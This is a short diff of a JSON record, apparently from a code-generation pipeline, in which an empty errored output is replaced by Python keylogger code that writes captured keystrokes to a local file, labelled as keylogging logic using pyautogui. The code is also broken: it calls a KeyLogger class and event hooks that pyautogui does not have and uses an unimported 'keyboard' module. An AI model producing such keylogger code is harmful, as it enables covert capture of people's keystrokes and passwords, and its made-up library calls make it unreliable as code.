@@ -1,6 +1,6 @@
 {
-  "output": "",
-  "notes": "{'ERROR: Generator JSON error'}",
+  "output": "import pyautogui\n\nkeylog_file = open('keylogs.txt', 'a')\n\nlistener = pyautogui.KeyLogger()\n\ndef log_keystroke(key):\n    if key.isprintable():\n        keylog_file.write(key)\n    else:\n        keylog_file.write('[{}]'.format(key))\n\nlistener.Key.press_event += log_keystroke\n\ntry:\n    listener.start()\n    while True:\n        if keyboard.is_pressed('esc'):\n            break\nfinally:\n    listener.stop()\n    keylog_file.close()\n",
+  "notes": "Keylogging logic implemented using pyautogui library",
   "applied_fixes": [],
   "iterations": 1
 }
